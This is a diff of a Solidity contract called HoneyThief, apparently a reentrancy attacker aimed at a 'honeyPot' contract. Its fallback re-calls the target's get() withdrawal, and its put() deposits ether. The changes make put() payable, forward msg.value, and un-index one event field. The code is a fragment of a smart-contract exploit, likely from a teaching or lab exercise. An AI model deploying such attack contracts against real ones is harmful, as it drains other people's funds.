@@ -4,7 +4,7 @@ contract HoneyThief {
     
     address public honeyPot;
 
-    event LogFallback(address indexed sender, uint indexed value, uint indexed newBalance);
+    event LogFallback(address indexed sender, uint indexed value, uint newBalance);
 
     constructor(address honeyPotAddress) public {
         honeyPot = honeyPotAddress;
@@ -15,8 +15,8 @@ contract HoneyThief {
         honeyPot.call(abi.encodeWithSignature("get()", ""));
     }
 
-    function put() public {
-       bool success = honeyPot.call.value(1 ether)(abi.encodeWithSignature("put()", ""));
+    function put() public payable {
+       bool success = honeyPot.call.value(msg.value)(abi.encodeWithSignature("put()", ""));
        require(success, "Call failed.");
     }
 
@@ -24,6 +24,4 @@ contract HoneyThief {
         bool success = honeyPot.call(abi.encodeWithSignature("get()", ""));
         require(success, "Call failed.");
     }
-    
-
 }
